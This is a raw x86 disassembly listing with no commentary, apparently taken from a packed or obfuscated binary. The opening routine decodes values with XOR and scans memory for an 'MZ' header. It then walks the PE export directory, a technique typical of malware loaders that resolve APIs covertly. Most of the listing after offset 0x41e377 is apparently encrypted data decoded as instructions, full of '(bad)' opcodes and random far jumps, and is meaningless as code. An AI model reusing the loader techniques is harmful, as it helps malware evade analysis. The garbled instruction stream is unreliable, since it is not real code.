  41e1d4:	mov    DWORD PTR ds:0x432e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x432e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x432eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	repnz test si,dx
  41e386:	ror    ebx,cl
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	and    DWORD PTR [ebp+0x6e62f6a1],0x6c
  41e395:	jmp    0xcf97:0x3e1b4753
  41e39c:	in     al,dx
  41e39d:	or     eax,0xc8a66744
  41e3a2:	xchg   BYTE PTR [edx+ebp*4],bh
  41e3a5:	fisttp QWORD PTR [esi+ebx*1]
  41e3a8:	mov    edi,0xe37bf518
  41e3ad:	neg    DWORD PTR [ebx]
  41e3af:	gs pushw es
  41e3b2:	in     eax,dx
  41e3b3:	jmp    0x8f58a2fd
  41e3b8:	or     BYTE PTR [esi-0x5edd4ec9],cl
  41e3be:	jg     0x41e3f7
  41e3c0:	inc    edx
  41e3c1:	fld    TBYTE PTR [eax]
  41e3c3:	cmp    ebp,ebx
  41e3c5:	add    esi,DWORD PTR [ecx]
  41e3c7:	pop    edi
  41e3c8:	fcom   DWORD PTR gs:[eax-0x4b]
  41e3cc:	sub    ecx,0xc
  41e3cf:	fmulp  st(1),st
  41e3d1:	pop    edi
  41e3d2:	jo     0x41e35d
  41e3d4:	(bad)  
  41e3d5:	ror    BYTE PTR [ecx-0x78],1
  41e3d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3d9:	cmp    edx,DWORD PTR [ebx-0x24]
  41e3dc:	sbb    ch,BYTE PTR [edi-0x7d06f7e]
  41e3e2:	lock lea edi,[edi]
  41e3e5:	dec    dh
  41e3e7:	(bad)  
  41e3e8:	xchg   esi,esp
  41e3ea:	nop
  41e3eb:	sti    
  41e3ec:	scas   al,BYTE PTR es:[edi]
  41e3ed:	jns    0x41e3bf
  41e3ef:	(bad)  
  41e3f1:	cs push ebx
  41e3f3:	push   edx
  41e3f4:	retf   
  41e3f5:	and    eax,0xe3d4ca9d
  41e3fa:	es aaa 
  41e3fc:	pushf  
  41e3fd:	inc    eax
  41e3fe:	push   DWORD PTR [edx+0x6]
  41e401:	retf   
  41e402:	(bad)  
  41e403:	fidivr WORD PTR [esi+0x36b0e9eb]
  41e409:	push   ds
  41e40a:	leave  
  41e40b:	xor    esi,eax
  41e40d:	add    dh,ch
  41e40f:	mov    ds:0x9fa9aa72,al
  41e414:	test   al,0xc
  41e416:	sbb    cl,BYTE PTR [ecx]
  41e418:	jmp    0x41e44d
  41e41a:	inc    ebp
  41e41c:	add    bh,BYTE PTR [ebx]
  41e41e:	adc    esp,DWORD PTR [ebx-0x832c1a2]
  41e424:	shl    BYTE PTR [eax+0x58],1
  41e427:	cmp    ecx,DWORD PTR [ebx+esi*4-0x34]
  41e42b:	adc    DWORD PTR [ebp-0x772be0a4],ebp
  41e431:	loop   0x41e46b
  41e433:	push   eax
  41e434:	mov    ebp,cr6
  41e437:	add    BYTE PTR [ebx+0x49e78adb],ah
  41e43d:	xchg   esp,eax
  41e43e:	cld    
  41e43f:	jecxz  0x41e3e1
  41e441:	push   ecx
  41e442:	cs xchg ecx,eax
  41e444:	ins    BYTE PTR es:[edi],dx
  41e445:	rcl    BYTE PTR [ebx+0x26ba32f3],0xf5
  41e44c:	mov    ds:0x3f75ad2a,al
  41e451:	xor    edx,DWORD PTR [esi+0x67]
  41e454:	in     eax,dx
  41e455:	retf   0xb13f
  41e458:	mov    esi,0x1c3e125a
  41e45d:	in     eax,dx
  41e45e:	or     DWORD PTR [esi*2+0x562f180d],0xb180673a
  41e469:	or     al,0xdf
  41e46b:	nop
  41e46c:	loope  0x41e4e3
  41e46e:	(bad)  
  41e46f:	aad    0xe6
  41e471:	sti    
  41e472:	lods   eax,DWORD PTR ds:[esi]
  41e473:	fldl2t 
  41e475:	inc    eax
  41e476:	cmp    dh,BYTE PTR [eax-0x2ebacdf]
  41e47c:	dec    eax
  41e47d:	ins    BYTE PTR es:[edi],dx
  41e47e:	push   eax
  41e47f:	push   ss
  41e480:	sub    eax,0x56f6cb84
  41e485:	add    dh,BYTE PTR [edi+0x3f]
  41e488:	jbe    0x41e446
  41e48a:	mov    al,ds:0xd680f707
  41e48f:	test   BYTE PTR [ebx+0x809cf66],dl
  41e495:	inc    edx
  41e496:	xchg   esi,eax
  41e497:	jmp    0x877c:0xbddc46c1
  41e49e:	mov    bl,0xb
  41e4a0:	mov    bh,0x4c
  41e4a2:	int    0x98
  41e4a4:	int    0x6f
  41e4a6:	adc    al,0x3a
  41e4a8:	lea    esi,[ecx+edi*2-0xe]
  41e4ac:	adc    DWORD PTR gs:[esi-0x77265532],ebx
  41e4b3:	sub    eax,esi
  41e4b5:	sub    al,ah
  41e4b7:	jg     0x41e500
  41e4b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4ba:	jge    0x41e4d5
  41e4bc:	(bad)  
  41e4be:	add    DWORD PTR [ebx-0x65],ebx
  41e4c1:	stos   BYTE PTR es:[edi],al
  41e4c2:	stc    
  41e4c3:	int    0x53
  41e4c5:	xor    eax,0x93ffbad5
  41e4ca:	pop    ebp
  41e4cb:	pop    ebx
  41e4cc:	jmp    0x41e4fa
  41e4ce:	dec    edi
  41e4cf:	sub    al,0xaf
  41e4d1:	cmp    DWORD PTR [ecx+0x3a6761d8],ebx
  41e4d7:	jo     0x41e507
  41e4d9:	bound  edx,QWORD PTR [ebp+esi*2-0x46061b5f]
  41e4e0:	out    dx,al
  41e4e1:	js     0x41e524
  41e4e3:	stc    
  41e4e4:	sub    al,0x9d
  41e4e6:	stos   DWORD PTR es:[edi],eax
  41e4e7:	cmp    ebp,esi
  41e4e9:	sbb    DWORD PTR [ebx+edi*4-0x40],0xffffffba
  41e4ee:	shr    DWORD PTR [esi-0x1e],cl
  41e4f1:	sub    edi,DWORD PTR [ebx+edi*1-0x72]
  41e4f5:	sbb    BYTE PTR [esi+0x2a],dh
  41e4f8:	aam    0x91
  41e4fa:	bound  eax,QWORD PTR ss:[ebx-0x40]
  41e4fe:	hlt    
  41e4ff:	push   esp
  41e500:	and    cl,BYTE PTR es:[ebp+0x4d129b23]
  41e507:	les    ebx,FWORD PTR [esi]
  41e509:	mov    ds:0xbe3cce01,al
  41e50e:	mov    ch,0x36
  41e510:	fcmove st,st(5)
  41e512:	push   es
  41e513:	pushf  
  41e514:	cmp    esp,DWORD PTR [ecx-0x10]
  41e517:	sar    DWORD PTR [esi-0x76a9cba3],1
  41e51d:	push   esi
  41e51e:	ins    BYTE PTR es:[edi],dx
  41e51f:	mov    al,0xcc
  41e521:	sub    DWORD PTR [eax-0x10c485d9],esp
  41e527:	jmp    0x41e585
  41e529:	push   ss
  41e52a:	dec    esp
  41e52b:	inc    ecx
  41e52c:	bound  ebp,QWORD PTR [ecx+esi*4]
  41e52f:	sub    DWORD PTR [edi+ebp*1-0x38b12373],0xd7d1f787
  41e53a:	ret    0x7225
  41e53d:	inc    esp
  41e53e:	bound  ebx,QWORD PTR [eax+0x2f]
  41e541:	sbb    al,0xa
  41e543:	mov    ebx,0x8d8b8319
  41e548:	retf   0xb1d0
  41e54b:	add    al,0x4f
  41e54d:	mov    al,ds:0x9106b3dc
  41e552:	and    bh,BYTE PTR [edx]
  41e554:	test   BYTE PTR [esi+0x4a5c19a6],dl
  41e55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e55b:	test   al,0x0
  41e55d:	js     0x41e5d8
  41e55f:	fs ja  0x41e519
  41e562:	xchg   esi,eax
  41e563:	call   0x41a3e748
  41e568:	push   ebp
  41e569:	pop    ss
  41e56a:	inc    esi
  41e56b:	fisttp DWORD PTR [edx]
  41e56d:	loope  0x41e55a
  41e56f:	pop    ebp
  41e570:	ss inc ebp
  41e572:	adc    edi,ebx
  41e574:	ds mov eax,0x31386773
  41e57a:	mov    ?,WORD PTR [esi]
  41e57c:	pop    ss
  41e57d:	or     BYTE PTR [ecx-0x46260288],bh
  41e583:	gs jge 0x41e589
  41e586:	sti    
  41e587:	lods   eax,DWORD PTR ds:[esi]
  41e588:	jl     0x41e5e5
  41e58a:	mov    ebp,0x3d8f39a
  41e58f:	xor    ebx,edi
  41e591:	(bad)  
  41e592:	jbe    0x41e54c
  41e594:	mov    eax,?
  41e596:	xlat   BYTE PTR ds:[ebx]
  41e597:	frstor [ecx+0x2c86845f]
  41e59d:	jecxz  0x41e537
  41e59f:	fucomi st,st(2)
  41e5a1:	pop    esp
  41e5a2:	js     0x41e61a
  41e5a4:	arpl   bp,bp
  41e5a6:	push   ss
  41e5a7:	xchg   ecx,eax
  41e5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a9:	popa   
  41e5aa:	arpl   WORD PTR [edx],di
  41e5ac:	mov    dl,0xf4
  41e5ae:	jne    0x41e592
  41e5b0:	pop    ecx
  41e5b1:	(bad)  
  41e5b2:	jbe    0x41e5f5
  41e5b4:	pop    esp
  41e5b5:	cmp    BYTE PTR [ecx+0x7ffd8118],dl
  41e5bb:	ficom  DWORD PTR [eax-0xaffd059]
  41e5c1:	cmp    ch,BYTE PTR [edx-0x1c]
  41e5c4:	pop    ebx
  41e5c5:	pop    ebp
  41e5c6:	push   edi
  41e5c7:	dec    edx
  41e5c8:	aad    0x37
  41e5ca:	mov    al,ds:0x13a36d8b
  41e5cf:	jmp    0x41e59d
  41e5d1:	addr16 inc esi
  41e5d3:	jnp    0x41e569
  41e5d5:	or     DWORD PTR [esi+0x55],eax
  41e5d8:	pop    edi
  41e5d9:	adc    eax,0xfbc6ba7d
  41e5de:	aaa    
  41e5df:	dec    ecx
  41e5e0:	ficom  DWORD PTR [ebp+0xf]
  41e5e3:	in     eax,dx
  41e5e4:	and    DWORD PTR gs:[edx],0xffffffee
  41e5e8:	add    eax,0x32db360f
  41e5ed:	jno    0x41e5bf
  41e5ef:	push   0x574d5993
  41e5f4:	pop    ecx
  41e5f5:	sub    edi,DWORD PTR [eax-0x77a041]
  41e5fb:	and    cl,0x97
  41e5fe:	jbe    0x41e604
  41e600:	popf   
  41e601:	fsubp  st(5),st
  41e603:	jnp    0x41e66f
  41e605:	fdivr  st(7),st
  41e607:	sbb    al,BYTE PTR [esi+0x23cd5698]
  41e60d:	sbb    DWORD PTR [ebp+ebx*2-0x4b],esp
  41e611:	dec    ecx
  41e612:	pusha  
  41e613:	fstp   TBYTE PTR [ecx]
  41e615:	neg    BYTE PTR [esp+edx*4-0x30]
  41e619:	push   eax
  41e61a:	dec    edx
  41e61b:	xchg   ecx,eax
  41e61c:	xor    al,0xf5
  41e61e:	fbld   TBYTE PTR [edi+0x2fdbf959]
  41e624:	xchg   ebp,eax
  41e625:	xor    DWORD PTR [esi+edx*4+0x62],ecx
  41e629:	scas   eax,DWORD PTR es:[edi]
  41e62a:	sti    
  41e62b:	test   edi,0x1c5f1609
  41e631:	or     BYTE PTR [ebx],ah
  41e633:	mov    ch,0x1e
  41e635:	xor    eax,0x6c0f5ed7
  41e63a:	mov    cs,dx
  41e63d:	(bad)  
  41e63e:	pop    ebp
  41e63f:	mov    ds:0x622c7a3e,al
  41e644:	push   ebx
  41e645:	test   DWORD PTR ds:0xf81b895d,ecx
  41e64b:	lahf   
  41e64c:	daa    
  41e64d:	pop    edi
  41e64e:	in     eax,0x4c
  41e650:	dec    edx
  41e651:	dec    edi
  41e652:	mov    dh,0xd7
  41e654:	pushf  
  41e655:	xchg   esp,eax
  41e656:	daa    
  41e657:	popa   
  41e658:	test   eax,0x70915592
  41e65e:	sbb    edi,DWORD PTR [esi]
  41e660:	ins    BYTE PTR es:[edi],dx
  41e661:	(bad)  
  41e662:	xor    ch,BYTE PTR [edx+0x31]
  41e665:	mov    dh,0xb3
  41e667:	xchg   edx,eax
  41e668:	add    ebx,DWORD PTR [edi+eiz*4]
  41e66b:	in     eax,dx
  41e66c:	mov    bl,0xd0
  41e66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e66f:	pushf  
  41e670:	push   cs
  41e671:	and    ah,BYTE PTR [edx]
  41e673:	cld    
  41e674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e675:	adc    al,0x34
  41e677:	adc    ebp,ebx
  41e679:	sbb    edx,DWORD PTR [esi+0x74]
  41e67c:	xchg   ebp,eax
  41e67d:	into   
  41e67e:	icebp  
  41e67f:	(bad)  
  41e680:	fidiv  WORD PTR [ebx+0x68]
  41e683:	xchg   DWORD PTR [eax],ebp
  41e685:	fbstp  TBYTE PTR [ecx+0x39dbb9a9]
  41e68b:	push   ecx
  41e68c:	add    al,0xb9
  41e68e:	mov    esp,0xbf22acf1
  41e693:	jmp    0x19fd:0xcd13bbba
  41e69a:	(bad)  
  41e69c:	cli    
  41e69d:	fild   DWORD PTR [eax-0x2f]
  41e6a0:	cmp    eax,0xd309e17b
  41e6a5:	repnz or esi,esp
  41e6a8:	push   esi
  41e6a9:	push   ds
  41e6aa:	jae    0x41e635
  41e6ac:	mov    ds:0xf0a56d9f,al
  41e6b1:	mov    bl,0xec
  41e6b3:	stos   BYTE PTR es:[edi],al
  41e6b4:	mov    edi,0x6f78cd08
  41e6b9:	and    eax,0x597c1e73
  41e6be:	test   DWORD PTR cs:[edx+0x5fa272d7],ecx
  41e6c5:	xlat   BYTE PTR cs:[ebx]
  41e6c7:	cmp    al,0xe5
  41e6c9:	sbb    esp,esp
  41e6cb:	jmp    0x6660:0x13c0b020
  41e6d2:	mov    cl,bh
  41e6d4:	les    eax,FWORD PTR [ebx]
  41e6d6:	pop    edx
  41e6d7:	inc    ebx
  41e6d8:	(bad)  
  41e6d9:	mov    esp,0x1b00e0ae
  41e6de:	out    0x99,al
  41e6e0:	shr    BYTE PTR [edx],0x3c
  41e6e3:	rcl    BYTE PTR [edx+0x32cd94d3],cl
  41e6e9:	cdq    
  41e6ea:	inc    ebp
  41e6eb:	jg     0x41e6d0
  41e6ed:	sbb    eax,0xfb5e579b
  41e6f2:	repnz das 
  41e6f4:	(bad)  
  41e6f5:	fstp   QWORD PTR [ecx]
  41e6f7:	lds    esi,FWORD PTR [esi-0x38124ede]
  41e6fd:	out    0x9e,eax
  41e6ff:	sahf   
  41e700:	mov    ch,0x8c
  41e702:	adc    al,0x73
  41e704:	ud2    
  41e706:	or     DWORD PTR [edx],esp
  41e708:	or     bl,dh
  41e70a:	inc    esi
  41e70b:	aam    0xde
  41e70d:	scas   al,BYTE PTR es:[edi]
  41e70e:	adc    DWORD PTR [ecx],ecx
  41e710:	fldenv [esi]
  41e712:	popf   
  41e713:	mov    ebp,0x82a3161f
  41e718:	leave  
  41e719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e71a:	adc    ch,BYTE PTR [edx]
  41e71c:	daa    
  41e71d:	div    DWORD PTR [edx-0x7]
  41e720:	adc    edi,esi
  41e722:	into   
  41e723:	std    
  41e724:	aas    
  41e725:	mov    edi,0x44809ee
  41e72a:	jmp    0x11ab:0x40e8e1b8
  41e731:	xor    al,ch
  41e733:	nop
  41e734:	xor    bl,BYTE PTR [ebp-0x767d3454]
  41e73a:	pop    edi
  41e73b:	cli    
  41e73c:	mov    bl,0x47
  41e73e:	mov    bh,0x84
  41e740:	sar    BYTE PTR [edi],0xe7
  41e743:	mov    ds:0x117c7650,eax
  41e748:	rcr    DWORD PTR [ecx+0x3],1
  41e74b:	or     ah,ah
  41e74d:	cmp    DWORD PTR [ecx+ebx*8],ebx
  41e750:	bound  ebx,QWORD PTR [edi+ebp*2]
  41e753:	adc    DWORD PTR [edi-0x1a460a7d],esi
  41e759:	call   0xab0153d6
  41e75e:	adc    al,0x8d
  41e760:	cdq    
  41e761:	and    eax,0xcf06b1ad
  41e766:	jbe    0x41e797
  41e768:	and    cl,dh
  41e76a:	or     esi,DWORD PTR [eax-0x27b7491b]
  41e770:	xchg   ecx,eax
  41e771:	mov    ?,WORD PTR [ebx]
  41e773:	into   
  41e774:	adc    edx,DWORD PTR [ecx+eiz*8]
  41e777:	push   es
  41e778:	ins    DWORD PTR es:[edi],dx
  41e779:	pushf  
  41e77a:	mov    al,0xe1
  41e77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e77d:	xor    eax,0x64f67d1e
  41e782:	jle    0x41e712
  41e784:	outs   dx,BYTE PTR ds:[esi]
  41e785:	aaa    
  41e786:	daa    
  41e787:	pop    esp
  41e788:	(bad)  
  41e789:	jge    0x41e758
  41e78b:	test   al,0xbd
  41e78d:	sub    al,0xf6
  41e78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e790:	push   ebp
  41e791:	pop    ebx
  41e792:	lea    edi,[edx-0x72]
  41e795:	and    BYTE PTR [esi-0x46acbc8],dl
  41e79b:	and    eax,DWORD PTR [eax]
  41e79d:	ficom  DWORD PTR [edi+eax*1+0x6cbd6baa]
  41e7a4:	mov    bl,BYTE PTR [edi+0xafe912]
  41e7aa:	dec    ecx
  41e7ab:	jmp    0x1048726
  41e7b0:	xchg   edi,eax
  41e7b1:	xchg   DWORD PTR [eax+0x52],esp
  41e7b4:	pop    es
  41e7b5:	inc    ebp
  41e7b6:	and    al,dh
  41e7b8:	sbb    BYTE PTR [edi],0xb8
  41e7bb:	fisub  WORD PTR [ebx-0x5b]
  41e7be:	stos   BYTE PTR es:[edi],al
  41e7bf:	ja     0x41e752
  41e7c1:	nop
  41e7c2:	mov    ebp,0xa2db537a
  41e7c7:	add    eax,0x74cb0f73
  41e7cc:	outs   dx,BYTE PTR ds:[esi]
  41e7cd:	sbb    bl,BYTE PTR [ecx]
  41e7cf:	xchg   ebx,eax
  41e7d0:	dec    esi
  41e7d1:	sbb    edx,DWORD PTR [eax]
  41e7d3:	mov    ah,BYTE PTR es:[ebp+0x1d]
  41e7d7:	shr    DWORD PTR [edi+esi*2+0x64],1
  41e7db:	cwde   
  41e7dc:	aas    
  41e7dd:	scas   eax,DWORD PTR es:[edi]
  41e7de:	sbb    BYTE PTR [ecx],bh
  41e7e0:	add    al,0xef
  41e7e2:	jns    0x41e7b2
  41e7e4:	lds    ecx,FWORD PTR [ebp-0x140e95a9]
  41e7ea:	stos   BYTE PTR es:[edi],al
  41e7eb:	and    DWORD PTR [ecx-0x67f1ed5d],edi
  41e7f1:	mov    dl,BYTE PTR [edi+0x7d]
  41e7f4:	mov    esp,0x82f18b2e
  41e7f9:	inc    edx
  41e7fa:	iret   
  41e7fb:	mov    ch,0xad
  41e7fd:	or     DWORD PTR [edi],0x8dcb0ada
  41e803:	and    ecx,DWORD PTR [edi+0x1b]
  41e806:	sbb    BYTE PTR [ecx],bl
  41e808:	mov    ebp,0x658816e6
  41e80d:	shl    BYTE PTR [edx+edx*4+0x4b35d05c],1
  41e814:	pop    esi
  41e815:	(bad)  [edi+0x1ab66bb7]
  41e81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81c:	pusha  
  41e81d:	das    
  41e81e:	mov    dh,0xdd
  41e820:	mov    eax,ds:0x47deb559
  41e825:	cmp    cl,al
  41e827:	jmp    0xff7b2e2f
  41e82c:	sbb    BYTE PTR [ebx],bl
  41e82e:	inc    edx
  41e82f:	pop    edi
  41e830:	xchg   esp,eax
  41e831:	fld    DWORD PTR [eax]
  41e833:	dec    edx
  41e834:	jecxz  0x41e853
  41e836:	mov    bl,0xd0
  41e838:	mul    DWORD PTR [ebp-0x1e]
  41e83b:	icebp  
  41e83c:	mov    bh,BYTE PTR [ebx]
  41e83e:	leave  
  41e83f:	adc    DWORD PTR [ecx-0x3e],ebx
  41e842:	mov    eax,0xef1c2368
  41e847:	mov    eax,ds:0x8b21ccc6
  41e84c:	push   ebx
  41e84d:	scas   eax,DWORD PTR es:[edi]
  41e84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84f:	pop    edi
  41e850:	cwde   
  41e851:	mov    ecx,0xf9787b81
  41e856:	int3   
  41e857:	sub    BYTE PTR [eax+0x4f],cl
  41e85a:	lea    edi,[ebx+ecx*1+0x56f4f257]
  41e861:	sbb    BYTE PTR [edi*2-0x53c9ccbf],bl
  41e868:	jecxz  0x41e87c
  41e86a:	bound  esi,QWORD PTR [edi-0x10]
  41e86d:	jmp    0xfeb603bd
  41e872:	mov    ?,WORD PTR [eax+0x5c]
  41e875:	ds cdq 
  41e877:	repz jne 0x41e814
  41e87a:	das    
  41e87b:	nop
  41e87c:	mov    esi,0x8e068398
  41e881:	clc    
  41e882:	push   ss
  41e883:	hlt    
  41e884:	in     eax,dx
  41e885:	out    0x48,eax
  41e887:	and    cl,BYTE PTR [esi+0x5e948876]
  41e88d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e88f:	fnstcw WORD PTR [esi]
  41e891:	ret    
  41e892:	pop    eax
  41e893:	dec    esp
  41e894:	xchg   edi,eax
  41e895:	je     0x41e889
  41e897:	cwde   
  41e898:	daa    
  41e899:	out    0x32,eax
  41e89b:	inc    ebx
  41e89c:	loope  0x41e893
  41e89e:	sbb    al,0x55
  41e8a0:	loopne 0x41e843
  41e8a2:	test   eax,0x225cbd3b
  41e8a7:	ja     0x41e866
  41e8a9:	pop    esi
  41e8aa:	pop    ebp
  41e8ab:	fist   WORD PTR [ebx+0x2a]
  41e8ae:	or     eax,0x3e5aa756
  41e8b3:	and    DWORD PTR [ecx+0x31],ecx
  41e8b6:	stos   BYTE PTR es:[edi],al
  41e8b7:	bound  ebp,QWORD PTR gs:[edx-0x370e9885]
  41e8be:	int    0x4f
  41e8c0:	aas    
  41e8c1:	jecxz  0x41e935
  41e8c3:	push   0x1d
  41e8c5:	ss mov eax,0x388a1144
  41e8cb:	cld    
  41e8cc:	les    edx,FWORD PTR [edx-0x1ff505c7]
  41e8d2:	cdq    
  41e8d3:	js     0x41e883
  41e8d5:	add    ch,BYTE PTR cs:[edi-0x12]
  41e8d9:	mov    eax,ds:0xdc07b330
  41e8de:	daa    
  41e8df:	pop    esi
  41e8e0:	fsub   QWORD PTR [ecx-0x50]
  41e8e3:	lds    ebx,FWORD PTR [edi]
  41e8e5:	sbb    eax,esp
  41e8e7:	pushf  
  41e8e8:	mov    ax,0xaed8
  41e8ec:	fcom   DWORD PTR [edi+0x5]
  41e8ef:	push   esi
  41e8f0:	ins    DWORD PTR es:[edi],dx
  41e8f1:	clc    
  41e8f2:	dec    eax
  41e8f3:	jmp    0x14bf165a
  41e8f8:	ss adc eax,0xb5c4457e
  41e8fe:	stos   BYTE PTR es:[edi],al
  41e8ff:	test   al,0xca
  41e901:	sti    
  41e902:	(bad)  
  41e903:	lahf   
  41e904:	hlt    
  41e905:	mov    bh,0x5e
  41e907:	out    0x46,eax
  41e909:	jge    0x41e966
  41e90b:	xlat   BYTE PTR ds:[ebx]
  41e90c:	mov    ah,0xbe
  41e90e:	into   
  41e90f:	mov    bl,BYTE PTR [ebp-0x50]
  41e912:	or     esp,DWORD PTR [edi]
  41e914:	sbb    dl,BYTE PTR [ecx]
  41e916:	loopne 0x41e916
  41e918:	lods   eax,DWORD PTR ds:[esi]
  41e919:	rol    WORD PTR [ebp*1+0x65c1b5be],1
  41e921:	stc    
  41e922:	and    al,0x7a
  41e924:	add    DWORD PTR [edi+edx*1+0x67aeb82b],ebx
  41e92b:	add    eax,0xbca7a7d4
  41e930:	shl    BYTE PTR [ecx+0x7b],1
  41e933:	mov    edx,0x805d060
  41e938:	popf   
  41e939:	mov    al,0x52
  41e93b:	cli    
  41e93c:	outs   dx,BYTE PTR ds:[esi]
  41e93d:	xor    BYTE PTR [ecx],dh
  41e93f:	mov    eax,0xe360576a
  41e944:	jb     0x41e8f5
  41e946:	mov    ebp,0x295fb3c5
  41e94b:	sbb    DWORD PTR [esi-0xb444ff8],esi
  41e951:	ss fs pushw 0x40
  41e956:	retf   
  41e957:	aam    0x3
  41e959:	and    edx,ebx
  41e95b:	mov    ebp,0x5d946a9c
  41e960:	xor    BYTE PTR [esi-0x3],dl
  41e963:	inc    edx
  41e964:	sbb    al,0x7b
  41e966:	in     al,dx
  41e967:	ins    DWORD PTR es:[edi],dx
  41e968:	out    0xe9,al
  41e96a:	dec    bl
  41e96c:	icebp  
